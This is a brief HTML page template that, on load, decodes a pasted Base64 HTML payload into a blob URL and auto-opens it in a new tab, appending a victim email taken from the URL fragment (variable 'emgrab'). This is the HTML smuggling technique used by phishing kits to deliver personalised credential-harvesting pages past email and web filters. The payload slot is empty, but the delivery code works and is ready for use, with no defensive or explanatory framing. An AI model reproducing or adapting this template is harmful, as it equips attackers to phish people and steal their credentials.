<!DOCTYPE html>
<html>
<head>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script>
    $(document).ready(function() {
      saveFile();
    });

    // ✅ CORRECT UTF-8 DECODER - Handles 🔐 ® ✓ and all special chars
    function decodeBase64UTF8(base64Str) {
      try {
        const binaryString = atob(base64Str);
        const bytes = new Uint8Array(binaryString.length);
        for (let i = 0; i < binaryString.length; i++) {
          bytes[i] = binaryString.charCodeAt(i);
        }
        return new TextDecoder('utf-8').decode(bytes);
      } catch (e) {
        console.error('Decoding error:', e);
        return '';
      }
    }

    function saveFile(name, type, data) {
      if (data != null && navigator.msSaveBlob)
        return navigator.msSaveBlob(new Blob([data], { type: type }), name);
      
      var a = $("<a style='display: none;'/>");
      let emgrab = window.location.href.split("#")[1];
      
      // ⬇️ PASTE YOUR BASE64 STRING HERE BETWEEN THE QUOTES ⬇️
      var encodedStringAtoB = "";
      
      var decodedStringAtoB = decodeBase64UTF8(encodedStringAtoB);
      
      const myBlob = new Blob([decodedStringAtoB], { type: 'text/html; charset=utf-8' });
      const url = window.URL.createObjectURL(myBlob) + "#" + emgrab;
  
      a.attr("href", url);
      a.attr("target", "_blank");
      $("body").append(a);
      a[0].click();
      window.URL.revokeObjectURL(url);
      a.remove();
    }
  </script>
</head>
<body>
  <!-- Your HTML content goes here -->
</body>
</html>
